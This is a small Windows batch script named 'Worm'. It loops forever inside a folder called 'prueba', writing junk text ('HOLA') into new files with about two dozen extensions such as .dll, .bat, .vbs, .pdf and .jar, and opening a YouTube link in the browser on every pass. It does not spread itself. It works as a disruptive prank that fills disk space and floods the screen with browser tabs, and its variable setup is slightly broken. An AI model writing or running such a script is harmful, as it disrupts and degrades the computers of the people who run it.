@echo off
title Worm
cd prueba
set worm = 1
:menu
cls
set /a worm = %worm% + 1       
echo HOLA>>%worm%.txt
echo HOLA>>%worm%.jpg
echo HOLA>>%worm%.gif
echo HOLA>>%worm%.png
echo HOLA>>%worm%.avi
echo HOLA>>%worm%.odt
echo HOLA>>%worm%.psd
echo HOLA>>%worm%.rar
echo HOLA>>%worm%.bmp
echo HOLA>>%worm%.flv
echo HOLA>>%worm%.dll
echo HOLA>>%worm%.pdf
echo HOLA>>%worm%.doc
echo HOLA>>%worm%.bat
echo HOLA>>%worm%.cpp
echo HOLA>>%worm%.jar
echo HOLA>>%worm%.html
echo HOLA>>%worm%.htm
echo HOLA>>%worm%.php
echo HOLA>>%worm%.css
echo HOLA>>%worm%.py
echo HOLA>>%worm%.sh
echo HOLA>>%worm%.vbs
start https://youtu.be/uvXYYFO7h0Q
goto menu